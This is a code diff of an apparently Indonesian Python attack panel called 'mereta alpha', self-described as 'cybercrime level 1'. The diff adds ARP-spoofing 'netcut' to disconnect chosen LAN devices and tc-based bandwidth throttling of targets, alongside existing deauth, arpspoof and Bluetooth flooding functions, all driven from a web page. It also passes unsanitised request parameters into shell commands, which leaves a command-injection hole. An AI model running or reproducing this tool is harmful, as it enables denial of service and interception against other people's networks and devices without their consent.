@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-mereta alpha v2.1 - cybercrime level 1
-with add new network & wifi control
+mereta alpha v3.0 - cybercrime level 1
+with netcut & speed control - add network & wifi control
 """
 
 import os
@@ -22,6 +22,77 @@ current_attack = "idle"
 scan_results = []
 devices_found = []
 bluetooth_running = False
+netcut_running = False
+netcut_target = None
+speed_limit_running = False
+
+# ============================================
+# fungsi netcut (potong koneksi device)
+# ============================================
+
+def get_gateway():
+    try:
+        result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
+        return result.stdout.split()[2] if result.stdout else "192.168.188.1"
+    except:
+        return "192.168.188.1"
+
+def netcut_start(target_ip, duration=60):
+    """potong koneksi target dengan arp spoofing"""
+    global netcut_running, netcut_target
+    netcut_running = True
+    netcut_target = target_ip
+    gateway = get_gateway()
+    end = time.time() + duration
+    
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    
+    while netcut_running and time.time() < end:
+        os.system(f"arpspoof -i {interface} -t {target_ip} {gateway} > /dev/null 2>&1 &")
+        os.system(f"arpspoof -i {interface} -t {gateway} {target_ip} > /dev/null 2>&1 &")
+        time.sleep(2)
+    
+    netcut_stop()
+
+def netcut_stop():
+    global netcut_running, netcut_target
+    netcut_running = False
+    netcut_target = None
+    os.system("sudo pkill -9 arpspoof")
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+
+# ============================================
+# fungsi speed control (limit bandwidth)
+# ============================================
+
+def set_speed_limit(target_ip, speed_kbps):
+    """limit kecepatan internet target (kbps)"""
+    global speed_limit_running
+    speed_limit_running = True
+    
+    # bersihkan rules lama
+    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
+    
+    # tambah rules baru
+    os.system(f"sudo tc qdisc add dev {interface} root handle 1: htb default 30")
+    os.system(f"sudo tc class add dev {interface} parent 1: classid 1:1 htb rate {speed_kbps}kbit")
+    os.system(f"sudo tc filter add dev {interface} parent 1: protocol ip prio 1 u32 match ip dst {target_ip} flowid 1:1")
+    os.system(f"sudo tc filter add dev {interface} parent 1: protocol ip prio 1 u32 match ip src {target_ip} flowid 1:1")
+    
+    return True
+
+def remove_speed_limit():
+    """hapus semua limit bandwidth"""
+    global speed_limit_running
+    speed_limit_running = False
+    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
+
+def apply_speed_to_all(speed_kbps):
+    """limit semua device dalam jaringan (slow internet semua)"""
+    os.system(f"sudo tc qdisc del dev {interface} root 2>/dev/null")
+    os.system(f"sudo tc qdisc add dev {interface} root handle 1: htb default 30")
+    os.system(f"sudo tc class add dev {interface} parent 1: classid 1:1 htb rate {speed_kbps}kbit")
+    return True
 
 # ============================================
 # fungsi wifi control & add network
@@ -38,28 +109,14 @@ def set_wifi_on(enable):
         os.system("nmcli radio wifi off")
 
 def add_wifi_network(ssid, password):
-    """tambah jaringan wifi baru"""
     try:
-        # buat config file
-        config = f"""
-network={{
-    ssid="{ssid}"
-    psk="{password}"
-    key_mgmt=WPA-PSK
-}}
-"""
-        with open("/tmp/new_wifi.conf", "w") as f:
-            f.write(config)
-        
-        # tambahkan ke wpa_supplicant
-        os.system("sudo wpa_passphrase '{}' '{}' >> /etc/wpa_supplicant/wpa_supplicant.conf".format(ssid, password))
+        os.system(f"sudo wpa_passphrase '{ssid}' '{password}' >> /etc/wpa_supplicant/wpa_supplicant.conf")
         os.system("sudo wpa_cli reconfigure")
         return True
     except:
         return False
 
 def enable_ap_mode(ssid="MERETA", password="12345678"):
-    """jadikan pi sebagai access point"""
     os.system("sudo nmcli dev wifi hotspot ifname wlan0 ssid MERETA password 12345678")
     return True
 
@@ -100,19 +157,17 @@ def device_scan():
     global devices_found
     devices_found = []
     
-    # arp scan
     try:
         result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
         for line in result.stdout.split('\n'):
             if "(" in line and ")" in line:
                 ip = line.split("(")[1].split(")")[0]
                 mac = line.split("at ")[1].split(" ")[0] if "at " in line else "unknown"
-                if ip.startswith("192.168"):
+                if ip.startswith("192.168") and ip != get_ip():
                     devices_found.append({"ip": ip, "mac": mac, "status": "online"})
     except:
         pass
     
-    # ping sweep parallel
     base_ip = "192.168.1"
     alive = []
     
@@ -130,8 +185,9 @@ def device_scan():
     for t in threads:
         t.join()
     
-    # deteksi tipe device
     for ip in alive[:30]:
+        if ip == get_ip():
+            continue
         device_type = "unknown"
         for port, dtype in [(80, "web"), (22, "ssh"), (23, "router"), 
                             (443, "https"), (554, "cctv"), (37777, "cctv"), 
@@ -224,6 +280,8 @@ def stop_all():
     attack_running = False
     current_attack = "idle"
     bluetooth_running = False
+    netcut_stop()
+    remove_speed_limit()
     os.system("sudo pkill -9 aireplay-ng 2>/dev/null")
     os.system("sudo pkill -9 arpspoof 2>/dev/null")
     os.system("sudo pkill -9 l2ping 2>/dev/null")
@@ -237,6 +295,16 @@ def get_network_info():
     except:
         return {"gateway": "unknown", "wifi_status": False}
 
+def get_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
+
 # ============================================
 # web server html
 # ============================================
@@ -246,7 +314,7 @@ html_page = '''<!doctype html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>mereta alpha v2</title>
+<title>mereta alpha v3</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 body{background:#fff;font-family:'courier new',monospace;font-weight:300;font-size:12px;color:#cc0000;padding:15px;}
@@ -257,24 +325,58 @@ body{background:#fff;font-family:'courier new',monospace;font-weight:300;font-si
 .warning{background:#ffeeee;border-left:3px solid #cc0000;padding:8px;margin-bottom:15px;font-size:10px;}
 .section{margin-bottom:18px;}
 .section-title{font-size:10px;margin-bottom:6px;color:#cc0000;letter-spacing:1px;}
-input,button{background:#fff;border:1px solid #cc0000;color:#cc0000;padding:6px 10px;font-family:'courier new',monospace;font-size:11px;outline:none;}
-input{width:160px;}
+input,select,button{background:#fff;border:1px solid #cc0000;color:#cc0000;padding:6px 10px;font-family:'courier new',monospace;font-size:11px;outline:none;}
+input,select{width:160px;}
 button{cursor:pointer;margin:2px;}
 button:hover{background:#cc0000;color:#fff;}
 .result-area{margin-top:8px;padding:6px;border:1px solid #ffcccc;min-height:50px;max-height:120px;overflow-y:auto;font-size:10px;}
 .result-line{color:#cc0000;margin:2px 0;}
 .footer{margin-top:15px;padding-top:8px;border-top:1px solid #ffcccc;font-size:9px;}
 .status{color:#cc0000;}
+.speed-select{width:120px;}
 </style>
 </head>
 <body>
 <div class="container">
 <div class="header">
-<div class="title">mereta alpha v2</div>
-<div class="subtitle">cybercrime level 1 - with add network</div>
+<div class="title">mereta alpha v3</div>
+<div class="subtitle">cybercrime level 1 - netcut + speed control</div>
 </div>
 <div class="warning">
 [!] extreme danger - total destruction mode
+</div>
+
+<div class="section">
+<div class="section-title">> netcut (potong koneksi)</div>
+<select id="netcutTarget" class="speed-select">
+<option value="">pilih target</option>
+</select>
+<input type="number" id="netcutDuration" placeholder="duration(s)" value="30" style="width:80px;">
+<button id="netcutStart">netcut start</button>
+<button id="netcutStop">netcut stop</button>
+<div id="netcutStatus" class="result-area">not active</div>
+</div>
+
+<div class="section">
+<div class="section-title">> speed control (limit bandwidth)</div>
+<select id="speedTarget" class="speed-select">
+<option value="all">semua device</option>
+</select>
+<select id="speedLevel">
+<option value="0">0 kbps (mati total)</option>
+<option value="64">64 kbps (sangat lambat)</option>
+<option value="128">128 kbps (lambat)</option>
+<option value="256">256 kbps (sedang lambat)</option>
+<option value="512">512 kbps (normal lambat)</option>
+<option value="1024">1024 kbps (1 mbps)</option>
+<option value="2048">2048 kbps (2 mbps)</option>
+<option value="5120">5120 kbps (5 mbps)</option>
+<option value="10240">10240 kbps (10 mbps)</option>
+<option value="0">no limit (kencang)</option>
+</select>
+<button id="speedApply">apply limit</button>
+<button id="speedRemove">remove limit</button>
+<div id="speedStatus" class="result-area">no limit</div>
 </div>
 
 <div class="section">
@@ -325,6 +427,10 @@ button:hover{background:#cc0000;color:#fff;}
 </div>
 
 <script>
+const netcutStart = document.getElementById('netcutStart');
+const netcutStop = document.getElementById('netcutStop');
+const speedApply = document.getElementById('speedApply');
+const speedRemove = document.getElementById('speedRemove');
 const wifionbtn = document.getElementById('wifionbtn');
 const wifioffbtn = document.getElementById('wifioffbtn');
 const apbtn = document.getElementById('apbtn');
@@ -337,6 +443,12 @@ const apoverbtn = document.getElementById('apoverbtn');
 const btbtn = document.getElementById('btbtn');
 const stopbtn = document.getElementById('stopbtn');
 const duration = document.getElementById('duration');
+const netcutTarget = document.getElementById('netcutTarget');
+const speedTarget = document.getElementById('speedTarget');
+const speedLevel = document.getElementById('speedLevel');
+const netcutDuration = document.getElementById('netcutDuration');
+const netcutStatus = document.getElementById('netcutStatus');
+const speedStatus = document.getElementById('speedStatus');
 const wifiStatus = document.getElementById('wifiStatus');
 const addResult = document.getElementById('addResult');
 const scanresult = document.getElementById('scanresult');
@@ -356,16 +468,58 @@ async function updateStatus() {
     } catch(e) {}
 }
 
+async function loadDevices() {
+    const data = await fetchJson('/api/devices');
+    if(data.devices && data.devices.length > 0) {
+        let html = '';
+        for(let d of data.devices) {
+            html += `<option value="${d.ip}">${d.ip} (${d.type})</option>`;
+        }
+        netcutTarget.innerHTML = '<option value="">pilih target</option>' + html;
+        speedTarget.innerHTML = '<option value="all">semua device</option>' + html;
+    }
+}
+
+netcutStart.onclick = async () => {
+    const target = netcutTarget.value;
+    const dur = netcutDuration.value;
+    if(!target) {
+        netcutStatus.innerHTML = '<div class="result-line">pilih target dulu</div>';
+        return;
+    }
+    netcutStatus.innerHTML = '<div class="result-line">netcut starting...</div>';
+    await fetch(`/api/netcut/start?target=${target}&duration=${dur}`);
+    netcutStatus.innerHTML = `<div class="result-line">netcut active: ${target} (${dur}s)</div>`;
+    setTimeout(() => {
+        netcutStatus.innerHTML = '<div class="result-line">not active</div>';
+    }, dur * 1000);
+};
+
+netcutStop.onclick = async () => {
+    await fetch('/api/netcut/stop');
+    netcutStatus.innerHTML = '<div class="result-line">netcut stopped</div>';
+};
+
+speedApply.onclick = async () => {
+    const target = speedTarget.value;
+    const speed = speedLevel.value;
+    await fetch(`/api/speed/apply?target=${target}&speed=${speed}`);
+    speedStatus.innerHTML = `<div class="result-line">speed limit: ${speed} kbps untuk ${target}</div>`;
+};
+
+speedRemove.onclick = async () => {
+    await fetch('/api/speed/remove');
+    speedStatus.innerHTML = '<div class="result-line">no limit</div>';
+};
+
 wifionbtn.onclick = async () => {
     await fetch('/api/wifi/on');
     wifiStatus.innerHTML = '<div class="result-line">wifi turned on</div>';
-    updateStatus();
 };
 
 wifioffbtn.onclick = async () => {
     await fetch('/api/wifi/off');
     wifiStatus.innerHTML = '<div class="result-line">wifi turned off (bt jammer still works)</div>';
-    updateStatus();
 };
 
 apbtn.onclick = async () => {
@@ -414,6 +568,7 @@ devscanbtn.onclick = async () => {
             html += `<div class="result-line">  ${icon} ${d.ip} - ${d.type}</div>`;
         }
         devresult.innerHTML = html;
+        await loadDevices();
     } else {
         devresult.innerHTML = '<div class="result-line">no devices</div>';
     }
@@ -459,6 +614,7 @@ stopbtn.onclick = async () => {
 
 setInterval(updateStatus, 2000);
 updateStatus();
+loadDevices();
 </script>
 </body>
 </html>'''
@@ -511,6 +667,38 @@ class handler(BaseHTTPRequestHandler):
             self.send_header('content-type', 'application/json')
             self.end_headers()
             self.wfile.write(json.dumps({'devices': devices}).encode())
+        
+        elif self.path.startswith('/api/netcut/start'):
+            target = self.path.split('target=')[1].split('&')[0] if 'target=' in self.path else ''
+            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
+            if target:
+                threading.Thread(target=netcut_start, args=(target, duration)).start()
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b'{"status":"started"}')
+        
+        elif self.path == '/api/netcut/stop':
+            netcut_stop()
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b'{"status":"stopped"}')
+        
+        elif self.path.startswith('/api/speed/apply'):
+            target = self.path.split('target=')[1].split('&')[0] if 'target=' in self.path else 'all'
+            speed = int(self.path.split('speed=')[1]) if 'speed=' in self.path else 0
+            if target == 'all':
+                apply_speed_to_all(speed)
+            else:
+                set_speed_limit(target, speed)
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b'{"status":"applied"}')
+        
+        elif self.path == '/api/speed/remove':
+            remove_speed_limit()
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b'{"status":"removed"}')
         
         elif self.path.startswith('/api/attack/deauth'):
             duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
@@ -569,29 +757,19 @@ class handler(BaseHTTPRequestHandler):
             self.send_response(404)
             self.end_headers()
 
-def get_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except:
-        return "127.0.0.1"
-
 if __name__ == '__main__':
     os.system('clear')
     print('\033[91m╔════════════════════════════════════════════╗')
-    print('║              mereta alpha v2.1                ║')
-    print('║         cybercrime level 1 - web              ║')
-    print('║        with add network & wifi control        ║')
+    print('║              mereta alpha v3.0                ║')
+    print('║    cybercrime level 1 - netcut + speed        ║')
+    print('║        add network & wifi control             ║')
     print('╚════════════════════════════════════════════╝\033[0m')
     
     os.system(f"sudo ifconfig {interface} up 2>/dev/null")
     
     local_ip = get_ip()
     print(f'\n\033[91m[!]\033[0m server: http://{local_ip}:8080')
-    print(f'\033[91m[!]\033[0m fitur: add network | wifi on/off | ap mode')
+    print(f'\033[91m[!]\033[0m fitur: netcut | speed control | add network | wifi on/off | ap mode')
     print(f'\033[91m[!]\033[0m press ctrl+c to stop\n')
     
     server = HTTPServer(('0.0.0.0', 8080), handler)
@@ -599,4 +777,4 @@ if __name__ == '__main__':
         server.serve_forever()
     except KeyboardInterrupt:
         print('\n\033[91m[!]\033[0m terminated')
-        server.shutdown() 
+        server.shutdown()
